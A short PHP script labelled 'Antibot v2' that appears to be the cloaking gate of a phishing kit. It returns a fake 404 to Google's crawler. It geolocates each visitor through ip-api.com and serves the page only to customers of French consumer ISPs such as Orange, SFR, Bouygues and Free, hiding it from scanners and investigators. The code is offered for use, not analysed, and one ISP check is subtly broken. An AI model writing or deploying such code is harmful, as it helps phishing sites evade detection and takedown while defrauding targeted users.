<?php

//Antibot v2 By Thomas Edison (Code Style : PHP 7/8)

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false) {
    die('HTTP/1.0 404 Not Found');
}
function getIPP($ipv = '') {
    $ipinfo = file_get_contents("http://ip-api.com/json/".$ipv);
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}

$ip = $_SERVER['REMOTE_ADDR'];
$ipinfo_json = getIPP($ip);

$org = $ipinfo_json['as'] ?? "";
$isps = $ipinfo_json['isp'] ?? "";

if(!isset($_SESSION["isBot"])) $_SESSION["isBot"] = false;
if(!isset($_SESSION["bot"])) $_SESSION["bot"] = false;

$_SESSION["isBot"] = false;

if($_SESSION["isBot"] === false) {
    $_SESSION["isBot"] = true;
    $isps = ["bouygues", "orange", "sfr", "free", "wanadoo", "lyca", "syma"];
    $res = array_filter(array_map(function ($isp) use($org, $ip){
        return (strpos(strtolower($org), $isp) || in_array($ip, ["127.0.0.1", "::1"]));
    }, $isps), function ($bool) { return $bool; });
    $_SESSION["bot"] = empty($res) ? true : false;
}

if($_SESSION["bot"])
{
    die('404 Not Found');
}

?>